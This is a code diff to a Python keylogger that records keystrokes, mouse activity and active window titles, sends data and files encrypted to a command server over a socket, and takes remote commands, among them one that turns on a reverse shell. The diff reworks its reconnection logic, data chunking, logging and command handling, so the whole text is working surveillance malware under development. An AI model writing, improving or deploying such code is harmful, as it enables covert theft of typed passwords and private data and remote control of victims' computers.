@@ -1,5 +1,6 @@
 # -*- coding: utf-8 -*-
 import keyboard
+import logging
 import mouse
 import os
 import platform
@@ -14,6 +15,7 @@ from screeninfo import get_monitors
 from threading import Thread
 from win32gui import GetWindowText, GetForegroundWindow
 
+logging.basicConfig(level=logging.DEBUG) # Later set to logging.WARNING in order to mute the client
 reverse_shell_active = False
 
 class Keylogger:
@@ -32,7 +34,7 @@ class Keylogger:
         self.end_time = datetime.now()
 
         self.reconnect_interval = reconnect_interval
-        self.sock = socket.socket()
+        self.sock = None
         self.host = "127.0.0.1"
         self.port = 1005
 
@@ -121,52 +123,56 @@ class Keylogger:
 
 #--------------- SERVER FUNCTIONS ---------------#
     def connect_to_host(self):
+        self.sock = socket.socket()
         while not self.connected:
             try:
                 self.sock.connect((self.host, self.port))
                 self.connected = True
-            except ConnectionRefusedError:
+            except socket.error as err:
                 self.connected = False
+                logging.debug(err)
                 time.sleep(self.reconnect_interval)
-            except socket.error as e:
-                print(e)
 
-    def send_to_server(self, data: str | bytes, filename: str = None, dtype: str = None, length: int = None):
+    def send_to_server(self, data: str | bytes, filename: str = None, length: int = None):
         isfile = False
         if isinstance(data, str):
             data = data.encode(utils.ENCODING)
 
-        if all([filename, dtype, length]):
+        if all([filename, length]):
             isfile = True
-            header = "__".join(["file",filename, dtype, str(length)]).encode(utils.ENCODING)
-            self.send(utils.encrypt(header))
+            header = "__".join(["file",filename, str(length)]).encode(utils.ENCODING)
+            self.encrypt_and_send(header)
 
         maxsize = utils.BUFFSIZE-96
-        while len(data) > maxsize:
-            chunk = data[:maxsize]
-            time.sleep(0.000000001) # ??? Ich weiß nicht wieso, aber ohne hier Zeit zu verschwenden failt das encrypten!
-            encrypted_data = utils.encrypt(chunk)
-            self.send(encrypted_data)
-            data = data[maxsize:]
-        encrypted_data = utils.encrypt(data)
-        self.send(encrypted_data)
+        chunks = [data[i:i + maxsize] for i in range(0, len(data), maxsize)]
+        for chunk in chunks:
+            self.encrypt_and_send(chunk)
+            time.sleep(0.00001)
 
         if isfile:
-            self.send(utils.encrypt("done sending file".encode(utils.ENCODING)))
+            self.encrypt_and_send("done sending file".encode(utils.ENCODING))
 
-    def send(self, data):
+    def encrypt_and_send(self, data):
+        encrypted_data = utils.encrypt(data)
         while True:
             try:
-                self.sock.sendall(data)
+                self.sock.sendall(encrypted_data)
                 break
-            except socket.error as e:
+            except socket.error as err:
                 self.connected = False
+                logging.debug(err)
                 self.connect_to_host()
 
     def receive_message_from_server(self):
-        recv = self.sock.recv(utils.BUFFSIZE)
-        plaintext = utils.decrypt(recv).decode(utils.ENCODING)
-        return plaintext
+        try:
+            recv = self.sock.recv(utils.BUFFSIZE)
+            plaintext = utils.decrypt(recv).decode(utils.ENCODING)
+            return plaintext
+        except (socket.error, AttributeError) as err:
+                self.connected = False
+                logging.debug(err)
+                self.connect_to_host()
+        
 
 #--------------- POLLING FUNCTIONS ---------------#
     def check_foreground_window(self):
@@ -234,15 +240,17 @@ if __name__ == "__main__":
                 elif recv == "deactivate":
                     keylogger.deactivate()
                     keylogger.send_to_server("logging deactivated")
-                elif recv == "exit":
-                    keylogger.send_to_server("terminated")
-                    keylogger.stop()
-                    break
                 elif recv == "send":
-                    keylogger.send_to_server(data=utils.convert_file_to_bytes("test.png", "tmp"), filename="test", dtype="png", length=100000)
+                    filename = "test.png"
+                    data = utils.convert_file_to_bytes(filename, "tmp")
+                    keylogger.send_to_server(data=data, filename=filename, length=len(data))
                 elif recv == "shell":
                     reverse_shell_active = True
                     keylogger.send_to_server("reverse shell activated")
+                elif recv == "stop":
+                    keylogger.send_to_server("keylogger stopped")
+                    keylogger.stop()
+                    break
                 else:
                     keylogger.send_to_server("received")
                     print(recv)
